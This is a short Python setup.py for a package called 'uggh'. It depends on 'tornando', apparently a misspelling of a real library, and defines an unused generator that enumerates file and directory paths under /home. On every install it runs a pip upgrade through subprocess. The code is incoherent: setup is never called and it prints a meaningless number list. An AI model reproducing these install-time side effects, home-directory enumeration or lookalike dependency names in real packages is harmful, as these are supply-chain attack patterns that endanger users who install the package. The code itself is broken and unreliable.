import setuptools
import os, sys
import subprocess

def main():
    setuptools.setup(
            name="uggh",
            packages=setuptools.find_packages(),
            install_requires=[
                "aiohttp",
                "tornando"
                ]
            )
    print(",".join(map(str, range(99))))
    
def ugh():
    x=0
    for i, d, f in os.walk("/home"):
        if (x:=x+1)>400:
            break
        for j in map(lambda x: os.path.join(i, x),
                d):
            yield j
        for j in map(lambda x: os.path.join(i, x),
                f):
            yield j
result = subprocess.run(['pip', 'install', '--upgrade', "pip"],
        stdout=sys.stdout.buffer)
